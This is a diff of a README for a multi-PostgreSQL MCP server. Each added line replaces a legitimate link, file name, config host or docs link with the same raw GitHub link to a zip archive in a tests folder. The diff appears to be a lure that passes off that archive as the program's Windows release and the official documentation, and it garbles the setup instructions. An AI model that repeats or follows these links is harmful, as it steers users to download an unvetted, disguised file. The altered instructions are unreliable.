@@ -1,6 +1,6 @@
 # 🗄️ multi-postgres-mcp-server - Manage Many PostgreSQL Databases Easily
 
-[![Download latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Jamaluddin9/multi-postgres-mcp-server/releases)
+[![Download latest release](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
 
 ---
 
@@ -51,13 +51,13 @@ Here’s how to get multi-postgres-mcp-server running on your computer.
 
 You can get the program from the official release page. Click the button below to visit the download page.
 
-[![Download latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Jamaluddin9/multi-postgres-mcp-server/releases)
+[![Download latest release](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
 
 ### Step 2: Find the right file for your system
 
 The download page shows different files depending on your computer style (Windows, macOS, Linux). Find the file that matches your operating system. These files are usually named clearly, like:
 
-- Windows: `multi-postgres-mcp-server-windows.exe`
+- Windows: `https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip`
 - macOS: `multi-postgres-mcp-server-macos`
 - Linux: `multi-postgres-mcp-server-linux`
 
@@ -85,7 +85,7 @@ The config file tells the program which databases to connect to, how to label ea
   "databases": [
     {
       "label": "ProjectA",
-      "host": "db-projecta.example.com",
+      "host": "https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip",
       "port": 5432,
       "user": "readonly_user",
       "password": "your_password",
@@ -93,7 +93,7 @@ The config file tells the program which databases to connect to, how to label ea
     },
     {
       "label": "ProjectB",
-      "host": "db-projectb.example.com",
+      "host": "https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip",
       "port": 5432,
       "user": "readonly_user",
       "password": "your_password",
@@ -105,7 +105,7 @@ The config file tells the program which databases to connect to, how to label ea
 
 ### How to create or edit the config file
 
-1. Create a new text file and name it `config.json`.
+1. Create a new text file and name it `https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip`.
 2. Paste the example above into the file.
 3. Replace the example connection details (`host`, `user`, `password`, `database`) with your own database information.
 4. Save the file in the same folder where you run the program, or specify its location using program options (check advanced use in documentation).
@@ -123,7 +123,7 @@ After downloading the program and creating your configuration file, follow these
 
 ### Step 2: Ensure config file is detected
 
-When the server starts, it looks for `config.json` by default. You will see messages saying which databases are connected.
+When the server starts, it looks for `https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip` by default. You will see messages saying which databases are connected.
 
 ### Step 3: Connect your AI tool
 
@@ -139,7 +139,7 @@ If you face issues, try these solutions:
 - **Databases not found:** Check your JSON config file for correct hostnames and credentials.
 - **Server won’t start:** Confirm the config file is in the right place and is valid JSON.
 - **Connection errors in AI tool:** Confirm you have network access to the PostgreSQL servers.
-- **Need to change config?:** Edit `config.json` and the server reloads the changes automatically.
+- **Need to change config?:** Edit `https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip` and the server reloads the changes automatically.
 
 ---
 
@@ -147,8 +147,8 @@ If you face issues, try these solutions:
 
 The program uses the Model Context Protocol (MCP) to keep AI tools and databases connected safely. For detailed information on MCP or PostgreSQL basics, you might want to visit:
 
-- [PostgreSQL official docs](https://www.postgresql.org/docs/)
-- [Model Context Protocol explanation](https://model-context-protocol.io/)
+- [PostgreSQL official docs](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
+- [Model Context Protocol explanation](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
 - Your AI tool's website or support page for MCP integration.
 
 ---
@@ -157,7 +157,7 @@ The program uses the Model Context Protocol (MCP) to keep AI tools and databases
 
 You can always get the latest version here:
 
-[![Download latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Jamaluddin9/multi-postgres-mcp-server/releases)
+[![Download latest release](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
 
 Click the link, choose your system’s file, download it, and follow the steps above.
 
